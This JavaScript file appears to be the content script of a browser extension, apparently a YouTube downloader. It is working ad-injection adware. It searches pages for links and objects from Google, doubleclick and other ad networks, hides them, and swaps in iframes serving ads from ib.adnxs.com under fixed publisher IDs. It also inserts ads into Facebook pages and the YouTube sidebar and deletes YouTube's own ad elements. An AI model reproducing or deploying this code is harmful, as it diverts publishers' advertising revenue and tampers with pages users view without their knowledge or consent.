var text=["/google/ad","/google/adv.","doubleclick","googlesyndication","avazu","/google_ad_","/google_ads","/google_ads/\*","/google_ads_","/google_afc","/google_afc_","/google_lander2\.js","/googlead\-","/googlead\.","/googlead160\.","/GoogleAd300\.","/googlead_","/googleservices","/googleadhp\.","/googleadhpbot\.","/googleadhtml/\*","/googleadright\.","/googleads\-","/googleads\.","/googleads/\*","/googleads2\.","/googleads3widetext\.","/googleads_","/googleadsafc_","/googleadsafs_","/googleadsense\.","/googleafs\.","/googleafvadrenderer\.","/googleleader\.","/googlempu\.","avazu","fastclick","banman","clicksor","bet365affiliates","infolinks","admelt","adnetwork","ad.adnetwork","metaffiliation","bdv.bidvertiser"];var rowsa=document.getElementsByTagName("a");var rowso=document.getElementsByTagName("object");for(var n=0;n<text.length;n++)
{var line=text[n];if(line)
{var line=line.replace(/([*+.?|\\\[\]{}()])/g,'\\$1');var matches=line;for(i=0;i<rowsa.length;i++){var diva=rowsa[i].getAttribute('href');if(diva){var inset;if(diva.match(matches)){var parentDiv=rowsa[i].parentNode;var height=parentDiv.offsetHeight;var width=parentDiv.offsetWidth;height=parseInt(height);width=parseInt(width);rowsa[i].style.display="none";if(height>250&&height<275){inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';parentDiv.style.height='250px';parentDiv.style.overflow='show';}
else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="'+adsscript728+'"></iframe>';else if(height>600&&height<610&&width>160)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610&&width<140)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}}}
for(i=0;i<rowso.length;i++){var divo=rowso[i].getAttribute('data');if(divo){if(divo.match(matches)){rowso[i].style.display="none";var parentDiv=rowso[i].parentNode;var height=parentDiv.offsetHeight;height=parseInt(height);var inset;if(height>250&&height<275)
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}}}}}

var fbphoto=document.getElementById("pagelet_reminders");

var childGuest = document.createElement("div");
insetfb='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';
childGuest.innerHTML=insetfb;
if (fbphoto){
if (fbphoto.nextSibling) {
  fbphoto.parentNode.insertBefore(childGuest,fbphoto.nextSibling);
}
else {
  fbphoto.parentNode.appendChild(childGuest);
}}
 
var text=["/google/ad\?","/google/adv\.","adserver","doubleclick","adbooth","ads\.betfair","googlesyndication","/google_ad_","/google_ads\.","/google_ads/\*","google_ads_","/google_afc\.","/google_afc_","/google_lander2\.js","/googlead\-","/googlead\.","/googlead160\.","/GoogleAd300\.","/googlead_","/googleservices","/googleadhp\.","/googleadhpbot\.","/googleadhtml/\*","/googleadright\.","/googleads\-","/googleads\.","/googleads/\*","/googleads2\.","/googleads3widetext\.","/googleads_","/googleadsafc_","/googleadsafs_","/googleadsense\.","/googleafs\.","/googleafvadrenderer\.","/googleleader\.","/googlempu\.","avazu","fastclick","banman","clicksor","bet365affiliates","infolinks","admelt","adnetwork","metaffiliation","bidvertiser"];var rowsa=document.getElementsByTagName("a");var rowso=document.getElementsByTagName("object");for(var n=0;n<text.length;n++)
{var line=text[n];if(line)
{var line=line.replace(/([*+.?|\\\[\]{}()])/g,'\\$1');var matches=line;for(i=0;i<rowsa.length;i++){var diva=rowsa[i].getAttribute('href');if(diva){var inset;if(diva.match(matches)){var parentDiv=rowsa[i].parentNode;var height=parentDiv.offsetHeight;var width=parentDiv.offsetWidth;height=parseInt(height);width=parseInt(width);rowsa[i].style.display="none";if(height>250&&height<275){inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';parentDiv.style.height='250px';parentDiv.style.overflow='show';}
else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="'+adsscript728+'"></iframe>';else if(height>600&&height<610&&width>160)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610&&width<140)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}}}
for(i=0;i<rowso.length;i++){var divo=rowso[i].getAttribute('data');if(divo){if(divo.match(matches)){rowso[i].style.display="none";var parentDiv=rowso[i].parentNode;var height=parentDiv.offsetHeight;height=parseInt(height);var inset;if(height>250&&height<275)
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340560&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>600&&height<610)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340561&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%"></iframe>';parentDiv.innerHTML=inset;}}}}}


if (window.location.href.match(/youtube.com/i)) {
					var elemYou3 = document.getElementsByClassName("watch-sidebar-body")[0];
					var checkDiv3 = document.getElementById("YoutubeDown_ads3");
					var checkDiv3b = document.getElementById("google_companion_ad_div");
					var checkDiv3c = document.getElementById("ad300x250");
					var checkDiv3d = document.getElementById("watch-channel-brand-div");
					
					if(checkDiv3d) { 
					checkDiv3d.parentNode.removeChild(checkDiv3d);
					}
					
					if(checkDiv3b) { 
					checkDiv3b.parentNode.removeChild(checkDiv3b);
					}
					
					if(checkDiv3c) { 
					checkDiv3c.parentNode.removeChild(checkDiv3c);
					}
					
					if(!checkDiv3){
					
					var spYou3 = document.createElement("div");
					spYou3.setAttribute("id", "YoutubeDown_ads3");
					spYou3.setAttribute("style", "text-align:right; padding-top: 5px; padding-bottom: 15px;");
					var spYou2 = document.createElement("iframe");
					spYou2.setAttribute("id","iFa_ads3");
					spYou2.setAttribute("type","content");
					spYou2.setAttribute("style","display:none;");
					spYou2.setAttribute("src","http://ib.adnxs.com/tt?id=1340556&cb=[CACHEBUSTER]&pubclick=%%CLICKTAG%%");
					spYou2.setAttribute("onLoad","this.style.display=\"block\";");
					spYou2.setAttribute("frameborder","0");
					spYou2.setAttribute("height","250");
					spYou2.setAttribute("width","300");
					spYou2.setAttribute("marginwidth","0");
					spYou2.setAttribute("marginheight","0");
					spYou2.setAttribute("scrolling","no");
					spYou3.appendChild(spYou2);
					
					if(elemYou3){ 
					elemYou3.parentNode.insertBefore(spYou3, elemYou3);
					}
}
}